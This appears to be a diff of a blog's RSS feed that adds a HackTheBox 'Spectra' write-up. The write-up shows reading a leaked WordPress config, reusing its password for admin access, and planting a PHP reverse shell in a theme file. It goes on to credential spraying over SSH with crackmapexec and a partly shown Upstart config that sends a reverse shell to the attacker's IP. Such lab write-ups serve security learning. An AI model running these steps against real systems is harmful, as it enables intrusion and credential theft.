@@ -5,7 +5,357 @@
     <link>https://fahmifj.github.io/tags/password-reuse/</link>
     <description>Recent content in Password-reuse on Ef&#39;s log</description>
     <generator>Hugo -- gohugo.io</generator>
-    <lastBuildDate>Mon, 14 Jun 2021 21:46:38 +0700</lastBuildDate><atom:link href="https://fahmifj.github.io/tags/password-reuse/index.xml" rel="self" type="application/rss+xml" />
+    <lastBuildDate>Sat, 26 Jun 2021 21:27:14 +0700</lastBuildDate><atom:link href="https://fahmifj.github.io/tags/password-reuse/index.xml" rel="self" type="application/rss+xml" />
+    <item>
+      <title>HackTheBox - Spectra</title>
+      <link>https://fahmifj.github.io/writeups/hackthebox/htb-spectra/</link>
+      <pubDate>Sat, 26 Jun 2021 21:27:14 +0700</pubDate>
+      
+      <guid>https://fahmifj.github.io/writeups/hackthebox/htb-spectra/</guid>
+      <description>Spectra is an easy machine from HackTheBox that runs a Chrome OS. It starts with enumerating a WordPress website which has directory listing enabled, and it exposes a config file that contains a database password. The password can be used to login into the admin dashboard, allowing me to insert a PHP reverse shell into the web page and gain a foothold on the system. Internal enumeration finds another password used for auto-login, and it can be used to escalate to user.</description>
+      <content:encoded><![CDATA[<p>Spectra is an easy machine from HackTheBox that runs a Chrome OS. It starts with enumerating a WordPress website which has directory listing enabled, and it exposes a config file that contains a database password. The password can be used to login into the admin dashboard, allowing me to insert a PHP reverse shell into the web page and gain a foothold on the system. Internal enumeration finds another password used for auto-login, and it can be used to escalate to user. The user has sudo privileges on <code>initctl</code>, and this can be leveraged to get a root shell.</p>
+<h3 id="skills-learned">Skills Learned</h3>
+<ul>
+<li>Exploiting WordPress</li>
+<li>Command Injection</li>
+</ul>
+<h3 id="tools">Tools</h3>
+<ul>
+<li>Nmap</li>
+<li>CrackMapExec</li>
+</ul>
+<h2 id="reconnaissance">Reconnaissance</h2>
+<h3 id="nmap">Nmap</h3>
+<p><code>nmap</code> full scan discovers three open ports: SSH on port 22, Nginx web server in port 80, and MySQL.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">→ root@kali «spectra» «10.10.14.21» 
+$ nmap -p- -sV --reason -oA nmap/10-allport 10.10.10.229
+Starting Nmap 7.80 <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2021-05-15 10:10 EDT
+Nmap scan report <span style="color:#66d9ef">for</span> 10.10.10.229
+Host is up, received echo-reply ttl <span style="color:#ae81ff">63</span> <span style="color:#f92672">(</span>0.052s latency<span style="color:#f92672">)</span>.
+Not shown: <span style="color:#ae81ff">65532</span> closed ports
+Reason: <span style="color:#ae81ff">65532</span> resets
+PORT     STATE SERVICE REASON         VERSION
+22/tcp   open  ssh     syn-ack ttl <span style="color:#ae81ff">63</span> OpenSSH 8.1 <span style="color:#f92672">(</span>protocol 2.0<span style="color:#f92672">)</span>
+80/tcp   open  http    syn-ack ttl <span style="color:#ae81ff">63</span> nginx 1.17.4
+3306/tcp open  mysql   syn-ack ttl <span style="color:#ae81ff">63</span> MySQL <span style="color:#f92672">(</span>unauthorized<span style="color:#f92672">)</span>
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</span> IP address <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> host up<span style="color:#f92672">)</span> scanned in 123.14 seconds
+</code></pre></div><p>MySQL service is normally tied to 127.0.0.1, but <code>nmap</code> already identified that I have no access there.</p>
+<p>Running a script scan didn&rsquo;t find any interesting information.</p>
+<h2 id="enumeration">Enumeration</h2>
+<h3 id="tcp-80---spectrahtb">TCP 80 - spectra.htb</h3>
+<p>The site appears to be under development.</p>
+<p><img class="img-container" src="imgs/image-20210515212024368.png" alt="image-20210515212024368"  />
+</p>
+<p>Inspecting page source discovers a hostname and two directories:</p>
+<ul>
+<li><a href="http://spectra.htb/main/index.php">http://spectra.htb/main/index.php</a></li>
+<li><a href="http://spectra.htb/testing/index.php">http://spectra.htb/testing/index.php</a></li>
+</ul>
+<p><img class="img-container" src="imgs/image-20210515212038877.png" alt="image-20210515212038877"  />
+</p>
+<p>I&rsquo;ll update my <code>/etc/hosts</code> with the hostname.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">→ root@kali «spectra» «10.10.14.21» 
+$ echo <span style="color:#e6db74">&#39;10.10.10.229 spectra.htb&#39;</span> &gt;&gt; /etc/hosts
+</code></pre></div><p>Poking with <code>curl</code>, shows that with or without the hostname it&rsquo;s the same site.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@kali «~» «10.10.14.9» 
+$ curl -s http://spectra.htb/ | wc -c
+<span style="color:#ae81ff">283</span>
+→ root@kali «~» «10.10.14.9» 
+$ curl -s http://10.10.10.229 | wc -c
+<span style="color:#ae81ff">283</span>
+</code></pre></div><p>Clicking on &ldquo;<strong>Software Issue Tracker</strong>&rdquo;, redirects to a WordPress site and nothing interesting except one default post by administrator.</p>
+<p><img class="img-container" src="imgs/image-20210626224157109.png" alt="image-20210626224157109"  />
+</p>
+<p>Visiting &ldquo;<strong>Test</strong>&rdquo;, the site page shows an error message about database connection.</p>
+<p><img class="img-container" src="imgs/image-20210515214125642.png" alt="image-20210515214125642"  />
+</p>
+<p>Removing <code>index.php</code> from URL, discovers that this page has directory listing is enabled.</p>
+<p><img class="img-container" src="imgs/image-20210515221118144.png" alt="image-20210515221118144"  />
+</p>
+<p>The  <code>wp-config.php.save</code> file draws my attention. It contains a set of database credentials.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">→ root@kali «spectra» «10.10.14.21» 
+$ curl http://spectra.htb/testing/wp-config.php.save
+&lt;?php
+...&lt;SNIP&gt;...
+
+define<span style="color:#f92672">(</span> <span style="color:#e6db74">&#39;DB_NAME&#39;</span>, <span style="color:#e6db74">&#39;dev&#39;</span> <span style="color:#f92672">)</span>;
+
+/** MySQL database username */
+define<span style="color:#f92672">(</span> <span style="color:#e6db74">&#39;DB_USER&#39;</span>, <span style="color:#e6db74">&#39;devtest&#39;</span> <span style="color:#f92672">)</span>;
+
+/** MySQL database password */
+define<span style="color:#f92672">(</span> <span style="color:#e6db74">&#39;DB_PASSWORD&#39;</span>, <span style="color:#e6db74">&#39;devteam01&#39;</span> <span style="color:#f92672">)</span>;
+
+/** MySQL hostname */
+define<span style="color:#f92672">(</span> <span style="color:#e6db74">&#39;DB_HOST&#39;</span>, <span style="color:#e6db74">&#39;localhost&#39;</span> <span style="color:#f92672">)</span>;
+...&lt;SNIP&gt;...
+</code></pre></div><h2 id="foothold">Foothold</h2>
+<h3 id="shell-as-nginx">Shell as nginx</h3>
+<h4 id="wp-admin-dashboard">WP-Admin Dashboard</h4>
+<p>The database password works with administrator (<code>administrator:devteam01</code>), it allows me to access the admin dashboard.</p>
+<p><img class="img-container" src="imgs/image-20210626225944808.png" alt="image-20210626225944808"  />
+</p>
+<h4 id="injecting-reverse-shell">Injecting Reverse Shell</h4>
+<p>Armed with administrator access, I could inject a PHP reverse shell script into one of the available themes' page and execute it by visiting the page URL.</p>
+<p>I&rsquo;ll put my <a href="https://github.com/pentestmonkey/php-reverse-shell">reverse shell</a> in <code>404.php</code> file of the Twenty Nineteen theme. The file can be found at <strong>Appearance</strong> -&gt; <strong>Theme Editor</strong>.</p>
+<p><img class="img-container" src="imgs/image-20210515231108016.png" alt="image-20210515231108016"  />
+</p>
+<p>I&rsquo;ll access this URL to get a shell: <code>http://spectra.htb/main/wp-content/themes/twentynineteen/404.php</code>, but it returns an error message pointing on line 12.</p>
+<p><img class="img-container" src="imgs/image-20210515231346411.png" alt="image-20210515231346411"  />
+</p>
+<p>I&rsquo;m able to resolve the error by commenting out the line 12.</p>
+<p><img class="img-container" src="imgs/image-20210515231422348.png" alt="image-20210515231422348"  />
+</p>
+<p>This time, I&rsquo;ll trigger the reverse shell using <code>curl</code>.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">→ root@kali «spectra» «10.10.14.21» 
+$ curl -s http://spectra.htb/main/wp-content/themes/twentynineteen/404.php
+</code></pre></div><p>On my listener.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">→ root@kali «spectra» «10.10.14.21» 
+$ nc -nvlp <span style="color:#ae81ff">9001</span>
+listening on <span style="color:#f92672">[</span>any<span style="color:#f92672">]</span> <span style="color:#ae81ff">9001</span> ...
+connect to <span style="color:#f92672">[</span>10.10.14.21<span style="color:#f92672">]</span> from <span style="color:#f92672">(</span>UNKNOWN<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>10.10.10.229<span style="color:#f92672">]</span> <span style="color:#ae81ff">35166</span>
+Linux spectra 5.4.66+ <span style="color:#75715e">#1 SMP Tue Dec 22 13:39:49 UTC 2020 x86_64 AMD EPYC 7302P 16-Core Processor AuthenticAMD GNU/Linux</span>
+ 09:14:42 up 10:53,  <span style="color:#ae81ff">0</span> users,  load average: 0.02, 0.04, 0.00
+USER     TTY        LOGIN@   IDLE   JCPU   PCPU WHAT
+uid<span style="color:#f92672">=</span>20155<span style="color:#f92672">(</span>nginx<span style="color:#f92672">)</span> gid<span style="color:#f92672">=</span>20156<span style="color:#f92672">(</span>nginx<span style="color:#f92672">)</span> groups<span style="color:#f92672">=</span>20156<span style="color:#f92672">(</span>nginx<span style="color:#f92672">)</span>
+$ id
+uid<span style="color:#f92672">=</span>20155<span style="color:#f92672">(</span>nginx<span style="color:#f92672">)</span> gid<span style="color:#f92672">=</span>20156<span style="color:#f92672">(</span>nginx<span style="color:#f92672">)</span> groups<span style="color:#f92672">=</span>20156<span style="color:#f92672">(</span>nginx<span style="color:#f92672">)</span>
+$ hostname
+spectra
+</code></pre></div><h4 id="shell-upgrade">Shell upgrade</h4>
+<p>I need to use the full path in order to upgrade my shell.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">$ which python3
+which: no python3 in <span style="color:#f92672">((</span>null<span style="color:#f92672">))</span>
+$ ls /usr/bin/ | grep python 
+python
+python-config
+python-wrapper
+python2
+python2.7
+python3
+python3.6
+python3.6m
+$ /usr/bin/python3 -c <span style="color:#e6db74">&#39;import pty;pty.spawn(&#34;/bin/bash&#34;)&#39;</span>
+nginx@spectra / $ export TERM<span style="color:#f92672">=</span>xterm
+nginx@spectra / $ ^Z
+<span style="color:#f92672">[</span>1<span style="color:#f92672">]</span>  + <span style="color:#ae81ff">7285</span> suspended  nc -nvlp <span style="color:#ae81ff">9001</span>
+→ root@kali «spectra» «10.10.14.21» 
+$ stty raw -echo; fg
+<span style="color:#f92672">[</span>1<span style="color:#f92672">]</span>  + <span style="color:#ae81ff">7285</span> continued  nc -nvlp <span style="color:#ae81ff">9001</span>
+
+nginx@spectra / $ 
+</code></pre></div><p>I&rsquo;ll add <code>/usr/bin</code> to current PATH variable, so I don&rsquo;t have to call the full path</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">nginx@spectra / $ env
+TERM<span style="color:#f92672">=</span>xterm
+USER<span style="color:#f92672">=</span>nginx
+PWD<span style="color:#f92672">=</span>/
+SHLVL<span style="color:#f92672">=</span><span style="color:#ae81ff">1</span>
+HOME<span style="color:#f92672">=</span>/home/nginx
+_<span style="color:#f92672">=</span>/usr/bin/env
+nginx@spectra / $ export PATH<span style="color:#f92672">=</span>$PATH:/usr/bin 
+nginx@spectra / $ which python
+/usr/local/bin/python
+</code></pre></div><h2 id="privilege-escalation">Privilege Escalation</h2>
+<h3 id="shell-as-katie">Shell as katie</h3>
+<h4 id="internal-enumeration">Internal Enumeration</h4>
+<p>There are 4 users with login shell in this machine.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">nginx@spectra / $ cat /etc/passwd | grep sh$  
+root:x:0:0:root:/root:/bin/bash
+chronos:x:1000:1000:system_user:/home/chronos/user:/bin/bash
+nginx:x:20155:20156::/home/nginx:/bin/bash
+katie:x:20156:20157::/home/katie:/bin/bash
+</code></pre></div><p>Enumerating home directory shows that the user flag is on katie.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">nginx@spectra / $ ls -lR /home 2&gt;/dev/null
+...&lt;SNIP&gt;...
+/home/katie:
+total <span style="color:#ae81ff">8</span>
+drwxr-xr-x <span style="color:#ae81ff">2</span> katie katie <span style="color:#ae81ff">4096</span> Jan <span style="color:#ae81ff">15</span> 15:55 log
+-r-------- <span style="color:#ae81ff">1</span> katie katie   <span style="color:#ae81ff">33</span> Feb  <span style="color:#ae81ff">2</span> 15:57 user.txt
+...&lt;SNIP&gt;...
+</code></pre></div><p>All the web files are located in <code>/usr/local/share/nginx/html/</code>.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">nginx@spectra / $ find / -type f -name wp-config.php 2&gt;/dev/null
+/usr/local/share/nginx/html/main/wp-config.php
+/usr/local/share/nginx/html/testing/wp-config.php
+/mnt/stateful_partition/dev_image/share/nginx/html/main/wp-config.php
+/mnt/stateful_partition/dev_image/share/nginx/html/testing/wp-config.php
+</code></pre></div><p>The <code>wp-config.php</code> file for <code>/main</code> has credentials with the one on <code>/testing</code>.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">nginx@spectra / $ cat /usr/local/share/nginx/html/main/wp-config.php
+...&lt;SNIP&gt;...
+// ** MySQL settings - You can get this info from your web host ** //
+/** The name of the database <span style="color:#66d9ef">for</span> WordPress */
+define<span style="color:#f92672">(</span> <span style="color:#e6db74">&#39;DB_NAME&#39;</span>, <span style="color:#e6db74">&#39;dev&#39;</span> <span style="color:#f92672">)</span>;
+
+/** MySQL database username */
+define<span style="color:#f92672">(</span> <span style="color:#e6db74">&#39;DB_USER&#39;</span>, <span style="color:#e6db74">&#39;dev&#39;</span> <span style="color:#f92672">)</span>;
+
+/** MySQL database password */
+define<span style="color:#f92672">(</span> <span style="color:#e6db74">&#39;DB_PASSWORD&#39;</span>, <span style="color:#e6db74">&#39;development01&#39;</span> <span style="color:#f92672">)</span>;
+...&lt;SNIP&gt;...
+</code></pre></div><p>In <code>/opt</code>, there is a file with uncommon extension called <code>autologin.conf.orig</code>.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">nginx@spectra /opt $ cat autologin.conf.orig 
+<span style="color:#75715e"># Copyright 2016 The Chromium OS Authors. All rights reserved.</span>
+<span style="color:#75715e"># Use of this source code is governed by a BSD-style license that can be</span>
+<span style="color:#75715e"># found in the LICENSE file.</span>
+description   <span style="color:#e6db74">&#34;Automatic login at boot&#34;</span>
+author        <span style="color:#e6db74">&#34;chromium-os-dev@chromium.org&#34;</span>
+<span style="color:#75715e"># After boot-complete starts, the login prompt is visible and is accepting</span>
+<span style="color:#75715e"># input.</span>
+start on started boot-complete
+script
+  passwd<span style="color:#f92672">=</span>
+  <span style="color:#75715e"># Read password from file. The file may optionally end with a newline.</span>
+  <span style="color:#66d9ef">for</span> dir in /mnt/stateful_partition/etc/autologin /etc/autologin; <span style="color:#66d9ef">do</span>
+    <span style="color:#66d9ef">if</span> <span style="color:#f92672">[</span> -e <span style="color:#e6db74">&#34;</span><span style="color:#e6db74">${</span>dir<span style="color:#e6db74">}</span><span style="color:#e6db74">/passwd&#34;</span> <span style="color:#f92672">]</span>; <span style="color:#66d9ef">then</span>
+      passwd<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;</span><span style="color:#66d9ef">$(</span>cat <span style="color:#e6db74">&#34;</span><span style="color:#e6db74">${</span>dir<span style="color:#e6db74">}</span><span style="color:#e6db74">/passwd&#34;</span><span style="color:#66d9ef">)</span><span style="color:#e6db74">&#34;</span>
+      break
+    <span style="color:#66d9ef">fi</span>
+  <span style="color:#66d9ef">done</span>
+  <span style="color:#66d9ef">if</span> <span style="color:#f92672">[</span> -z <span style="color:#e6db74">&#34;</span><span style="color:#e6db74">${</span>passwd<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">]</span>; <span style="color:#66d9ef">then</span>
+    exit <span style="color:#ae81ff">0</span>
+  <span style="color:#66d9ef">fi</span>
+...&lt;SNIP&gt;...
+</code></pre></div><p>Based on the comments, the file is an autologin script. It looks for <code>passwd</code> file in these directories:</p>
+<ul>
+<li><code>/mnt/stateful_partition/etc/autologin</code></li>
+<li><code>/etc/autologin</code></li>
+</ul>
+<p>I found the <code>passwd</code> file which contains a password in the <code>/etc/autologin/</code> directory.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">nginx@spectra /opt $ ls -l /etc/autologin/             
+total <span style="color:#ae81ff">4</span>
+-rw-r--r-- <span style="color:#ae81ff">1</span> root root <span style="color:#ae81ff">19</span> Feb  <span style="color:#ae81ff">3</span> 16:43 passwd
+nginx@spectra /opt $ cat /etc/autologin/passwd 
+SummerHereWeCome!!
+</code></pre></div><h4 id="ssh---katie">SSH - katie</h4>
+<p>I&rsquo;ll spray <code>SummerHereWeCome!!</code> and <code>development01</code> using <code>crackmapexec</code> to the users who have login shell.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">→ root@kali «spectra» «10.10.14.21» 
+$ crackmapexec ssh 10.10.10.229 -u users.list -p passwords.list
+SSH         10.10.10.229    <span style="color:#ae81ff">22</span>     10.10.10.229     <span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> SSH-2.0-OpenSSH_8.1
+SSH         10.10.10.229    <span style="color:#ae81ff">22</span>     10.10.10.229     <span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> chronos:devteam01 Bad authentication type; allowed types: <span style="color:#f92672">[</span><span style="color:#e6db74">&#39;publickey&#39;</span>, <span style="color:#e6db74">&#39;keyboard-interactive&#39;</span><span style="color:#f92672">]</span>
+SSH         10.10.10.229    <span style="color:#ae81ff">22</span>     10.10.10.229     <span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> chronos:development01 Bad authentication type; allowed types: <span style="color:#f92672">[</span><span style="color:#e6db74">&#39;publickey&#39;</span>, <span style="color:#e6db74">&#39;keyboard-interactive&#39;</span><span style="color:#f92672">]</span>
+SSH         10.10.10.229    <span style="color:#ae81ff">22</span>     10.10.10.229     <span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> chronos:SummerHereWeCome!! Bad authentication type; allowed types: <span style="color:#f92672">[</span><span style="color:#e6db74">&#39;publickey&#39;</span>, <span style="color:#e6db74">&#39;keyboard-interactive&#39;</span><span style="color:#f92672">]</span>
+SSH         10.10.10.229    <span style="color:#ae81ff">22</span>     10.10.10.229     <span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> katie:devteam01 Bad authentication type; allowed types: <span style="color:#f92672">[</span><span style="color:#e6db74">&#39;publickey&#39;</span>, <span style="color:#e6db74">&#39;keyboard-interactive&#39;</span><span style="color:#f92672">]</span>
+SSH         10.10.10.229    <span style="color:#ae81ff">22</span>     10.10.10.229     <span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> katie:development01 Bad authentication type; allowed types: <span style="color:#f92672">[</span><span style="color:#e6db74">&#39;publickey&#39;</span>, <span style="color:#e6db74">&#39;keyboard-interactive&#39;</span><span style="color:#f92672">]</span>
+SSH         10.10.10.229    <span style="color:#ae81ff">22</span>     10.10.10.229     <span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> katie:SummerHereWeCome!!
+</code></pre></div><p>The password <code>SummerHereWeCome!!</code> works on user <code>katie</code> .</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">→ root@kali «spectra» «10.10.14.21» 
+$ ssh katie@10.10.10.229
+Password: 
+katie@spectra ~ $ id 
+uid<span style="color:#f92672">=</span>20156<span style="color:#f92672">(</span>katie<span style="color:#f92672">)</span> gid<span style="color:#f92672">=</span>20157<span style="color:#f92672">(</span>katie<span style="color:#f92672">)</span> groups<span style="color:#f92672">=</span>20157<span style="color:#f92672">(</span>katie<span style="color:#f92672">)</span>,20158<span style="color:#f92672">(</span>developers<span style="color:#f92672">)</span>
+</code></pre></div><p>User flag is done here.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">katie@spectra ~ $ ls -la
+total <span style="color:#ae81ff">36</span>
+drwxr-xr-x <span style="color:#ae81ff">5</span> katie katie <span style="color:#ae81ff">4096</span> May <span style="color:#ae81ff">15</span> 12:17 .
+drwxr-xr-x <span style="color:#ae81ff">8</span> root  root  <span style="color:#ae81ff">4096</span> Feb  <span style="color:#ae81ff">2</span> 15:55 ..
+lrwxrwxrwx <span style="color:#ae81ff">1</span> root  root     <span style="color:#ae81ff">9</span> Feb  <span style="color:#ae81ff">2</span> 15:55 .bash_history -&gt; /dev/null
+-rw-r--r-- <span style="color:#ae81ff">1</span> katie katie  <span style="color:#ae81ff">127</span> Dec <span style="color:#ae81ff">22</span> 05:46 .bash_logout
+-rw-r--r-- <span style="color:#ae81ff">1</span> katie katie  <span style="color:#ae81ff">204</span> Dec <span style="color:#ae81ff">22</span> 05:46 .bash_profile
+-rw-r--r-- <span style="color:#ae81ff">1</span> katie katie  <span style="color:#ae81ff">551</span> Dec <span style="color:#ae81ff">22</span> 05:46 .bashrc
+drwx------ <span style="color:#ae81ff">2</span> katie katie <span style="color:#ae81ff">4096</span> May <span style="color:#ae81ff">15</span> 12:17 .gnupg
+drwx------ <span style="color:#ae81ff">3</span> katie katie <span style="color:#ae81ff">4096</span> Jan <span style="color:#ae81ff">15</span> 15:55 .pki
+drwxr-xr-x <span style="color:#ae81ff">2</span> katie katie <span style="color:#ae81ff">4096</span> Jan <span style="color:#ae81ff">15</span> 15:55 log
+-r-------- <span style="color:#ae81ff">1</span> katie katie   <span style="color:#ae81ff">33</span> Feb  <span style="color:#ae81ff">2</span> 15:57 user.txt
+</code></pre></div><h3 id="shell-as-root">Shell as root</h3>
+<h4 id="internal-enumeration-1">Internal Enumeration</h4>
+<p>The first thing I will check if I have the user&rsquo;s password is the sudo privileges, and this user has one on <a href="https://www.digitalocean.com/community/tutorials/the-upstart-event-system-what-it-is-and-how-to-use-it"><code>initctl</code></a>.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">katie@spectra ~ $ sudo -l
+User katie may run the following commands on spectra:
+    <span style="color:#f92672">(</span>ALL<span style="color:#f92672">)</span> SETENV: NOPASSWD: /sbin/initctl
+</code></pre></div><p>Unfortunately, <code>initctl</code> is not listed on GTFObins site. I&rsquo;ll have to look around.</p>
+<p>Enumerating for files owned by developers discovers some writable <code>.conf</code> files and a JavaScript file.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">katie@spectra ~ $ find / -type f -group developers -ls 2&gt;/dev/null
+    <span style="color:#ae81ff">32121</span>      <span style="color:#ae81ff">4</span> -rw-rw----   <span style="color:#ae81ff">1</span> root     developers      <span style="color:#ae81ff">478</span> Jun <span style="color:#ae81ff">29</span>  <span style="color:#ae81ff">2020</span> /etc/init/test6.conf
+    <span style="color:#ae81ff">32123</span>      <span style="color:#ae81ff">4</span> -rw-rw----   <span style="color:#ae81ff">1</span> root     developers      <span style="color:#ae81ff">478</span> Jun <span style="color:#ae81ff">29</span>  <span style="color:#ae81ff">2020</span> /etc/init/test7.conf
+    <span style="color:#ae81ff">32109</span>      <span style="color:#ae81ff">4</span> -rw-rw----   <span style="color:#ae81ff">1</span> root     developers      <span style="color:#ae81ff">478</span> Jun <span style="color:#ae81ff">29</span>  <span style="color:#ae81ff">2020</span> /etc/init/test3.conf
+    <span style="color:#ae81ff">32112</span>      <span style="color:#ae81ff">4</span> -rw-rw----   <span style="color:#ae81ff">1</span> root     developers      <span style="color:#ae81ff">478</span> Jun <span style="color:#ae81ff">29</span>  <span style="color:#ae81ff">2020</span> /etc/init/test4.conf
+    <span style="color:#ae81ff">32103</span>      <span style="color:#ae81ff">4</span> -rw-rw----   <span style="color:#ae81ff">1</span> root     developers      <span style="color:#ae81ff">478</span> Jun <span style="color:#ae81ff">29</span>  <span style="color:#ae81ff">2020</span> /etc/init/test.conf
+    <span style="color:#ae81ff">32126</span>      <span style="color:#ae81ff">4</span> -rw-rw----   <span style="color:#ae81ff">1</span> root     developers      <span style="color:#ae81ff">478</span> Jun <span style="color:#ae81ff">29</span>  <span style="color:#ae81ff">2020</span> /etc/init/test8.conf
+    <span style="color:#ae81ff">32128</span>      <span style="color:#ae81ff">4</span> -rw-rw----   <span style="color:#ae81ff">1</span> root     developers      <span style="color:#ae81ff">478</span> Jun <span style="color:#ae81ff">29</span>  <span style="color:#ae81ff">2020</span> /etc/init/test9.conf
+    <span style="color:#ae81ff">32106</span>      <span style="color:#ae81ff">4</span> -rw-rw----   <span style="color:#ae81ff">1</span> root     developers      <span style="color:#ae81ff">478</span> Jun <span style="color:#ae81ff">29</span>  <span style="color:#ae81ff">2020</span> /etc/init/test10.conf
+    <span style="color:#ae81ff">32108</span>      <span style="color:#ae81ff">4</span> -rw-rw----   <span style="color:#ae81ff">1</span> root     developers      <span style="color:#ae81ff">478</span> Jun <span style="color:#ae81ff">29</span>  <span style="color:#ae81ff">2020</span> /etc/init/test2.conf
+    <span style="color:#ae81ff">32120</span>      <span style="color:#ae81ff">4</span> -rw-rw----   <span style="color:#ae81ff">1</span> root     developers      <span style="color:#ae81ff">478</span> Jun <span style="color:#ae81ff">29</span>  <span style="color:#ae81ff">2020</span> /etc/init/test5.conf
+    <span style="color:#ae81ff">32105</span>      <span style="color:#ae81ff">4</span> -rw-rw----   <span style="color:#ae81ff">1</span> root     developers      <span style="color:#ae81ff">478</span> Jun <span style="color:#ae81ff">29</span>  <span style="color:#ae81ff">2020</span> /etc/init/test1.conf
+    <span style="color:#ae81ff">23763</span>      <span style="color:#ae81ff">4</span> -rwxrwxr-x   <span style="color:#ae81ff">1</span> root     developers      <span style="color:#ae81ff">251</span> Jun <span style="color:#ae81ff">29</span>  <span style="color:#ae81ff">2020</span> /srv/nodetest.js
+</code></pre></div><p>Those <code>.conf</code> files are configuration scripts to start <code>/srv/nodetest.js</code>.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">katie@spectra ~ $ cat /etc/init/test.conf 
+description <span style="color:#e6db74">&#34;Test node.js server&#34;</span>
+author      <span style="color:#e6db74">&#34;katie&#34;</span>
+
+start on filesystem or runlevel <span style="color:#f92672">[</span>2345<span style="color:#f92672">]</span>
+stop on shutdown
+
+script
+
+    export HOME<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;/srv&#34;</span>
+    echo $$ &gt; /var/run/nodetest.pid
+    exec /usr/local/share/nodebrew/node/v8.9.4/bin/node /srv/nodetest.js
+
+end script
+
+pre-start script
+    echo <span style="color:#e6db74">&#34;[`date`] Node Test Starting&#34;</span> &gt;&gt; /var/log/nodetest.log
+end script
+
+pre-stop script
+    rm /var/run/nodetest.pid
+    echo <span style="color:#e6db74">&#34;[`date`] Node Test Stopping&#34;</span> &gt;&gt; /var/log/nodetest.log
+end script
+</code></pre></div><h4 id="abusing-sudo-initctl">Abusing sudo initctl</h4>
+<p>The <code>/srv/nodetest.js</code> file itself is not important because with sudo privileges and write access on those configuration files, I can perform a command injection to send myself a reverse shell by leveraging <a href="https://gtfobins.github.io/gtfobins/node/#sudo">Node</a> .</p>
+<p>I&rsquo;ll create a copy of the configuration file, which contains reverse shell to my machine without the pre and post script part. I&rsquo;ll name it <code>exploit.conf</code>:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">→ root@kali «exploits» «10.10.14.21»
+$ cat exploit.conf
+description <span style="color:#e6db74">&#34;Test node.js server&#34;</span>
+author      <span style="color:#e6db74">&#34;katie&#34;</span>
+
+start on filesystem or runlevel <span style="color:#f92672">[</span>2345<span style="color:#f92672">]</span>
+stop on shutdown
+
+script
+
+    export RHOST<span style="color:#f92672">=</span>10.10.14.21
+    export RPORT<span style="color:#f92672">=</span><span style="color:#ae81ff">9001</span>
+    export HOME<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;/srv&#34;</span>
